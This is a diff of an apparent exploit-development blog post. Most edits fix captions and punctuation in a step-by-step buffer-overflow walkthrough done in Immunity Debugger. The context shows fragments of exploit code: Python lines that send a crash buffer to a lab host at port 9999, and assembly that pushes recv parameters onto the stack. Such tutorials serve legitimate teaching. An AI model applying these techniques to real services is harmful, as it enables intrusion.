@@ -258,7 +258,7 @@ add cl, 0x88
 ```console
 push ecx
 ```
-A look at the stack: 
+A look at the stack
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/011.png" alt="">
 
@@ -321,6 +321,10 @@ s.connect(("172.16.55.143", 9999))
 s.send(command+crash)
 ```
 Execution in Immunity:
+
+```console
+sub esp, 0x50
+```
 
 As we can see, ESP is now pointing about 50 bytes above our initial buffer of A's
 
@@ -399,15 +403,13 @@ Execution in Immunity:
 xor edx, edx
 ```
 
-EDX is now zero.
-
 <img src="{{ site.url }}{{ site.baseurl }}/images/016.png" alt="">
 
 ```console
 push edx
 ```
 
-A glimpse of the stack, with a value of zero:
+A glimpse of the stack, with a value of zero
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/017.png" alt="">
 
@@ -478,7 +480,7 @@ s.connect(("172.16.55.143", 9999))
 s.send(command+crash)
 ```
 
-Execution in Immunity
+Execution in Immunity:
 
 ```console
 add dh, 0x02
@@ -490,7 +492,7 @@ add dh, 0x02
 push edx
 ```
 
-Our BufSize and flags parameters are now on the stack!:
+Our BufSize and flags parameters are now on the stack!
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/019.png" alt="">
 
